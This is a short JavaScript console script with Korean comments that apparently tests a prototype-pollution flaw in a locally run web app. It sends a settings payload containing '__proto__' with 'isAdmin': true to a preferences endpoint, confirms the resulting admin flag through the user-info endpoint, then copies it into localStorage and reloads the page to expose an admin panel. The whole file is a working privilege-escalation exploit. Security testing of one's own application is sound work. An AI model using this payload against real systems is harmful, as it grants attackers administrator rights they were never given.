// Prototype Pollution 공격 후 UI 갱신 테스트
console.log('🔍 Prototype Pollution + UI 갱신 테스트 시작...\n');

async function fullUITest() {
  try {
    const token = localStorage.getItem('token');
    if (!token) {
      console.log('❌ 로그인이 필요합니다.');
      return;
    }
    
    console.log('1. 현재 사용자 정보 확인...');
    console.log('localStorage user:', JSON.parse(localStorage.getItem('user') || '{}'));
    
    console.log('\n2. Prototype Pollution 공격 실행...');
    const attackResponse = await fetch('http://localhost:5000/api/settings/preferences', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({
        settings: {
          "__proto__": { "isAdmin": true }
        }
      })
    });
    
    const attackResult = await attackResponse.json();
    console.log('공격 결과:', attackResult);
    
    console.log('\n3. 서버에서 업데이트된 사용자 정보 가져오기...');
    const userResponse = await fetch('http://localhost:5000/api/auth/me', {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    
    const userData = await userResponse.json();
    console.log('서버 사용자 정보:', userData.user);
    
    if (userData.user && userData.user.isAdmin) {
      console.log('\n🚨 isAdmin: true 확인됨!');
      
      console.log('4. localStorage 업데이트...');
      localStorage.setItem('user', JSON.stringify(userData.user));
      console.log('업데이트된 localStorage:', JSON.parse(localStorage.getItem('user')));
      
      console.log('\n5. Redux store 확인...');
      // Redux store 확인
      if (window.__REDUX_STORE__) {
        console.log('Redux store user:', window.__REDUX_STORE__.getState().auth.user);
      } else {
        console.log('Redux store를 직접 확인할 수 없음');
      }
      
      console.log('\n6. 페이지 새로고침으로 UI 갱신...');
      alert('🚨 권한 상승 성공! 페이지를 새로고침합니다. 헤더 드롭다운에서 "관리자 패널" 메뉴를 확인하세요!');
      
      // 3초 후 새로고침
      setTimeout(() => {
        window.location.reload();
      }, 1000);
      
    } else {
      console.log('❌ isAdmin 속성이 없습니다.');
      console.log('다시 시도해보세요.');
    }
    
  } catch (error) {
    console.error('테스트 오류:', error);
  }
}

// 즉시 실행
fullUITest();
